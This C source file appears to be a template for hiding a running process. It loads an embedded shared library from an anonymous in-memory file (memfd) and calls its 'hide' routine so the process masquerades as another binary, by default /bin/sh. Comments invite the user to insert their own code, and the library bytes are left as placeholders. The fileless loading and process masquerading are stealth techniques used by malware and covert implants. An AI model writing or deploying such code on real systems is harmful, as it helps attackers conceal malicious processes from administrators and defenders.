#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/limits.h>
#include <stdlib.h>

#define HIDE_SO {HIDE_SO_BYTES_PLACEHOLDER}
#define HIDE_SO_SIZE {HIDE_SO_SIZE_PLACEHOLDER}

//name passed to func has to be on the stack
//Eg. can be defined as follows: char bin_sh[8] = "/bin/sh\x00"
void hide(const char* name){
    int fd = memfd_create("tmp",0);
    if(fd < 0){
        fprintf(stderr,"Failed creating memfd: %m\n");
        exit(1);
    }
    size_t written_bytes = write(fd, HIDE_SO, HIDE_SO_SIZE);
    if(written_bytes < HIDE_SO_SIZE){
        fprintf(stderr,"Failed writing to memfd: %m\n");
        exit(1);
    }
    lseek(fd,0,SEEK_SET);
    
    char fname[PATH_MAX] = {0};
    snprintf(fname, PATH_MAX, "/proc/self/fd/%d",fd);

    void* dl_handle = dlopen(fname,RTLD_LAZY);
    void (*sym_hide)(const char* new_bin_name) = dlsym(dl_handle, "hide");
    sym_hide(name);
    
    dlclose(dl_handle);
    close(fd);
}



int main(void){
    int pid = getpid();

    printf("My PID: %d\n",pid);

    //change the name to whatever full path you want the process to imitate
    char bin_sh[8] = "/bin/sh\x00";
    hide(bin_sh);

    //Your code goes here
    while(1){
        sleep(1);
    }
    
}